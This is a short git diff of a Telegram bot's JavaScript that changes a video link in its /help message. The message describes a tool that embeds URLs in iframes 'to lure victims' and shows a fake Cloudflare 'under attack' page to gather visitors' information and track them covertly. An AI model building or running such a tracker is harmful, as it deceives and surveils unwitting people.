@@ -78,7 +78,7 @@ else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` HIE AWESOME 👍 USER !\n\nFIRST JOIN MY MAIN CHANNEL 🌎 @tcronebhackx 👊\n🤗HOW TO USE ME 🥺, PLEASE WATCH VIDEO BELOW 👇\n\nNOW WATCH THIS VIDEO 👉https://t.me/tcronebhackx/1988👈
+bot.sendMessage(chatId,` HIE AWESOME 👍 USER !\n\nFIRST JOIN MY MAIN CHANNEL 🌎 @tcronebhackx 👊\n🤗HOW TO USE ME 🥺, PLEASE WATCH VIDEO BELOW 👇\n\nNOW WATCH THIS VIDEO 👉https://t.me/paidtechzone/11👈
 \nAFTERWARDS I WILL ASK YOU A URL WHICH WILL BE USED IN IFRAME TO LURE VICTIMS. AFTER RECEIVING 2 URL LINKS YOU MUST CHOOSE 1 TO TRACK PEOPLE.\nCLOUDFLARE LINK : THIS METHOD WILL SHOW A Cloudflare UNDER ATTACK PAGE TO GATHER INFORMATION AND AFTERWARDS VICTIM WILL BE REDIRECTED TO DESTINATIONED.\n\nURL 2 WEBVIEW LINK : THIS WILL SHOW A WEBSITE ( EXAMPLE - BING , DATING SITES ETC ) USING IFRAME TO GATHERING INFORMATION.\n\n⚠️ WARNING ⚠️\n\nSOME SITES MAY NOT WORK UNDER THIS METHOD IF THEY HAVE X-FRAME HEADER PRESENT (EXAMPLE - HTTPS://GOOGLE.COM ).💡MY BEAUTIFUL ❤️ OWNER\n\n📨WHATSAPP - https://wa.me/message/LMYVBIUMYDBDF1\n\n🦞 DOWNLOAD PREMIUM MODS ON - https://woftech.vercel.app`);
       const videoPath = 'lv_0_20250328083501.mp4'; // Path to your video file
         bot.sendVideo(chatId, videoPath, { caption: 'Welcome to the bot! Here is a tutorial video.' });
